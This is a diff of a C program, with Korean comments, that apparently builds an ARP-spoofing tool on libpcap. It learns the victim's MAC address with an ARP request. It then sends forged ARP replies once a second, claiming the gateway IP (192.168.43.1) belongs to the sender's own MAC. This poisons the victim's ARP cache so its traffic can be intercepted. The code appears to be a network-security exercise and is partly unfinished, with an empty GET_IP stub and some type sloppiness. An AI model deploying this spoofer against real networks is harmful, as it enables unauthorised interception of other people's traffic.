@@ -66,16 +66,21 @@ int isRep(const uint8_t* pck){
     return 0;
 }
 
-void getSendMac(u_char* MAC, const u_char* pck){
+void getTargetMac(u_char* MAC, const u_char* pck){
     for(int i = 32;i<32+6;i++){
         MAC[i-32] = pck[i];
     }
 }
+void getDstMac(u_char* MAC, const u_char* pck){
+    for(int i = 6; i < 12; i++){
+        MAC[i-6] = pck[i];
+    }
+}
 
-
-void getTargetMac(u_char* MAC, const u_char* pck){
-    for(int i = 32;i<32+6;i++){
-        MAC[i-32] = pck[i];
+void getSendMac(u_char* MAC, const u_char* pck){
+    for(int i = 0;i<6;i++){
+        MAC[i] = pck[i];
+        printf("%x ", MAC[i]);
     }
 }
 
@@ -94,11 +99,21 @@ int getMyMac(char* myMac){
     return 1;
 }
 
-void modifyPAT(packet_type* pck, char value[]){
+int isSameIP(const u_char* pck){
+    u_char targetMac[6];
+    u_char myMac[6];
+    getTargetMac(targetMac, pck);
+    getMyMac(myMac);
+
+    return !memcmp(myMac, targetMac, MAC_SIZE);
+    // 같으면 1로 반환
+}
+
+void modifyPAT(packet_type* pck, u_char value[]){
     memcpy(pck->arp.pat, value, sizeof(*value));
 }
 
-void modifyTargetMAC(packet_type* pck, unsigned char value[]){
+void modifyTargetMAC(packet_type* pck, u_char value[]){
     for(int i =0; i<MAC_SIZE; i++){
         pck->arp.dstMAC[i] = value[i];
     }
@@ -108,19 +123,19 @@ void modifyTargetMAC(packet_type* pck, unsigned char value[]){
     }
 }
 
-void modifySendertMAC(packet_type* pck, unsigned char value[]){
+void modifySenderMAC(packet_type* pck, u_char value[]){
     for(int i = 0; i<MAC_SIZE; i++){
         pck->arp.srcMAC[i] = value[i];
     }
 }
 
-void modifyTargetIP(packet_type* pck, unsigned char value[]){
+void modifyTargetIP(packet_type* pck, u_char value[]){
     for(int i =0; i<IP_SIZE; i++){
         pck->arp.dstIP[i] = value[i];
     }
 }
 
-void modifySenderIP(packet_type* pck, unsigned char value[]){
+void modifySenderIP(packet_type* pck, u_char value[]){
     for(int i =0; i<IP_SIZE; i++){
         pck->arp.srcIP[i] = value[i];
     }
@@ -141,13 +156,13 @@ void modifyOP(packet_type* pck, int value){
     }
 }
 
-void modifyETHDestination(packet_type* pck, unsigned char value[]){
+void modifyETHDestination(packet_type* pck, u_char value[]){
     for(int i = 0; i<MAC_SIZE; i++){
         pck->eth.destination[i] = value[i];
     }
 }
 
-void modifyETHSource(packet_type* pck, unsigned char value[]){
+void modifyETHSource(packet_type* pck, u_char value[]){
     for(int i = 0; i<MAC_SIZE; i++){
         pck->eth.source[i] = value[i];
     }
@@ -178,8 +193,12 @@ void createPacket(packet_type *pck){
     memcpy(pck->arp.srcIP, spa, 4);
     u_char tha[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     memcpy(pck->arp.dstMAC, tha, 6);
-    u_char tpa[4] = {0xc0, 0xa8, 0x2b, 43};
+    u_char tpa[4] = {0xc0, 0xa8, 0x2b, 51};
     memcpy(pck->arp.dstIP, tpa, 4);
+}
+
+void GET_IP(char* ip){
+
 }
 
 
@@ -191,14 +210,16 @@ int main(int argc, char *argv[])
     // dstMAC을 sender_ip의 MAC으로
     packet_type pck;
 
+    const u_char* ucp_DATA;
+    pcap_t *stp_NIC;
 
     u_char myMac[6];
     getMyMac(myMac);
     char* interface = "wlp0s20f3";
     // char* interface = argv[1];
-    char sender_ip[] = {192,168,0,11};
+    char sender_ip[] = {192,168,43,43};
     //char* sender_ip = argv[2];
-    char gateway_ip[] = {192,168,0,1};
+    char gateway_ip[] = {192,168,43,1};
     //char* gateway_ip = argv[2];
     char errbuf[PCAP_ERRBUF_SIZE];
 
@@ -211,46 +232,78 @@ int main(int argc, char *argv[])
     struct pcap_pkthdr* header;
     const uint8_t* packet;
     u_char SenderMAC[6];
+    u_char DstMAC[6];
     packet_type data;
     createPacket(&data);
 
+    modifyTargetIP(&data, sender_ip);
+
     // TODO argv로 온 값 대체하기
     // 구조체화 시키기
-
+    modifySenderMAC(&data, myMac);
     pcap_sendpacket(handle, (const u_char*) &data, 42);
+
     while(true){
-
-        if(pcap_next_ex(handle, &header, &packet) == 0)
+        if(pcap_next_ex(handle, &header, &packet)==0){
             continue;
-        //printf("--\n");
-         if(isARP(packet) && isRep(packet)){
-             printf("--------------\n%02X%02X  %02X%02X", packet[12],packet[13],packet[20],packet[21]);
-
-             //reply 왔을때
-             printf("\nREP\n");
-             //TODO 맥어드레스 구하기
-             getSendMac(SenderMAC, packet);
-             // Broadcast통해 reply로 받은 패킷의 Sender MAC address
-             for(int i =0;i<sizeof(SenderMAC); i++){
-                 printf("%02x ", SenderMAC[i]);
-             }
-             printf("\n");
-             modifyETHDestination(&data, SenderMAC);
-             modifyETHSource(&data, gateway_ip);
-             modifyTargetMAC(&data, SenderMAC);
-             modifySenderIP(&data, gateway_ip);
-             modifyOP(&data, ARP_REPLY);
-
-             while(true){
-                 pcap_sendpacket(handle, (const u_char*) &data, 42);
-             }
-
-
-         }
-
-
+        }
+        if(isARP(packet) && isRep(packet)){
+            break;
+        }
     }
+    getSendMac(SenderMAC, packet);
+    getDstMac(DstMAC, packet);
+    printf("\n%d", memcmp(SenderMAC, myMac, MAC_SIZE));
+
+    //TODO sender의 맥주소까지 알아냈으니
+    // 패킷수정해서 보내자
+    // Dest MAC과 Target MAC이 sender MAC
+    modifyETHSource(&data, myMac);
+    modifySenderIP(&data, gateway_ip);
+    modifyTargetIP(&data, sender_ip);
+    modifyOP(&data, ARP_REPLY);
+    modifyTargetMAC(&data, DstMAC);
+    modifyETHDestination(&data, DstMAC);
+
+    printf("\n\n\n\n");
+    for(int i =0; i<MAC_SIZE; i++){
+        printf("%X ", SenderMAC[i]);
+    }
+
+
+
+    printf("\nIP\n");
+    for(int i =0; i<IP_SIZE;i++){
+        printf("%d ", data.arp.dstIP[i]);
+    }
+    printf("\n");
+
+/*
+ *     modifyETHDestination(&data, SenderMAC);
+    modifyETHSource(&data, myMac);
+
+    modifySenderIP(&data, gateway_ip);
+    modifySendertMAC(&data, myMac);
+    modifyTargetMAC(&data, SenderMAC);
+    modifyTargetIP(&data, sender_ip);
+    modifyOP(&data, ARP_REPLY);
+ */
+    printf("\nPress ^c to Exit.");
+    while(true){
+        pcap_sendpacket(handle, (const u_char*) &data, 42);
+        sleep(1);
+    }
+}
+/*
+          * 데스티네이션 상대
+          * 소스 자신
+          *
+          * 센더HA 자신
+          * 센더IP 43.1
+          * 타겟 HA 상대
+          * 타겟아이피 상대
+          */
+
+
     //계속보낼때
     // sender ip:
-
-}
